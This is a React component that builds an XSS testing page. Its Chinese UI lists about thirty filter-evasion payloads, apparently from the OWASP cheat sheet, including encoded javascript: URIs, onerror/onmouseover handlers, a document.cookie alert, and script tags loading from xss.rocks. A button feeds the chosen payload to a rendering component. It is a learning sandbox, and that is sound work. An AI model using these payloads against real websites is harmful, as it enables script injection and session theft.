import React, { useState } from "react";
import "./App.css";
import { XssComponent } from "./Component/XssComponent";
function App() {
  const [word, setWord] = useState('alert("hello")');
  const [applyWord, setApplyWord] = useState("");
  const changeHandler = ({ target }) => {
    setWord(target.value);
  };

  const importStr = () => {
    setApplyWord(word);
  };

  const strArray = [
    {
      title: `Basic XSS Test Without Filter Evasion`,
      value: `<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>`,
    },
    {
      title: "XSS Locator (Polygot)",
      value: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
    },
    {
      title: `Image XSS using the JavaScript directive`,
      value: `<IMG SRC="javascript:alert('XSS');">`,
    },
    {
      title: `No quotes and no semicolon`,
      value: `<IMG SRC=javascript:alert('XSS')>`,
    },
    {
      title: `Case insensitive XSS attack vector`,
      value: `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
    },
    {
      title: `HTML entities`,
      value: `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
    },
    {
      title: `Grave accent obfuscation`,
      value: `<IMG SRC=\`javascript:alert("RSnake says, 'XSS'")\`>`,
    },
    {
      title: `Malformed A tags`,
      value: `\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`,
    },
    {
      title: `Malformed IMG tags`,
      value: `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`,
    },
    {
      title: `fromCharCode`,
      value: `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
    },
    {
      title: `Default SRC tag to get past filters that check SRC domain`,
      value: `<IMG SRC=# onmouseover="alert('xxs')">`,
    },
    {
      title: `Default SRC tag by leaving it empty`,
      value: `<IMG SRC= onmouseover="alert('xxs')">`,
    },
    {
      title: `Default SRC tag by leaving it out entirely`,
      value: `<IMG onmouseover="alert('xxs')">`,
    },
    {
      title: `On error alert`,
      value: `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
    },
    {
      title: `On error alert`,
      value: `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
    },
    {
      title: `IMG onerror and javascript alert encode`,
      value: `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
    },
    {
      title: `Decimal HTML character references`,
      value: `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
    },
    {
      title: `Decimal HTML character references without trailing semicolons`,
      value: `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
    },
    {
      title: `Hexadecimal HTML character references without trailing semicolons`,
      value: `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
    },
    {
      title: `Embedded tab`,
      value: `<IMG SRC="jav	ascript:alert('XSS');">`,
    },
    {
      title: `Embedded Encoded tab`,
      value: `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
    },
    {
      title: `Embedded newline to break up XSS`,
      value: `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
    },
    {
      title: `Embedded carriage return to break up XSS`,
      value: `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
    },
    {
      title: `Null breaks up JavaScript directive`,
      value: `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`,
    },
    {
      title: `Spaces and meta chars before the JavaScript in images for XSS`,
      value: `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
    },
    {
      title: `Non-alpha-non-digit XSS`,
      value: `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
    },
    {
      title: `No closing script tags`,
      value: `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
    },
    {
      title: `Protocol resolution in script tags`,
      value: `<SCRIPT SRC=//xss.rocks/.j>`,
    },
    {
      title: "Double open angle brackets",
      value: "<iframe src=http://xss.rocks/scriptlet.html <",
    },
    {
      title: `Half open HTML/JavaScript XSS vector`,
      value: `<IMG SRC="\`<javascript:alert>\`('XSS')"`,
    },
    { title: `Escaping JavaScript escapes`, value: `\\\\";alert('XSS');//` },
    {
      title: "Ps圖片",
      value: `https://upload.wikimedia.org/wikipedia/commons/thumb/c/cf/Adobe_Photoshop_Express_logo.svg/1051px-Adobe_Photoshop_Express_logo.svg.png`,
    },
  ];

  const buttonMap = strArray.map((obj) => {
    return (
      <tr>
        <td>{obj.title}:</td>
        <td>
          <button onClick={() => setWord(obj.value)}>{obj.value}</button>
        </td>
      </tr>
    );
  });

  return (
    <div className="App">
      點選需要的文字，再按下 apply
      <hr />
      <table style={{ marginLeft: "auto", marginRight: "auto", border:"solid" }}>
        <tr ><th>XSS攻擊手段</th><td>替換文字</td></tr>
        {buttonMap}
      </table>
      <hr />
      <input value={word} onChange={changeHandler} />
      <button onClick={() => importStr()}>Apply</button>
      <hr />
      <XssComponent str={applyWord} />
    </div>
  );
}

export default App;
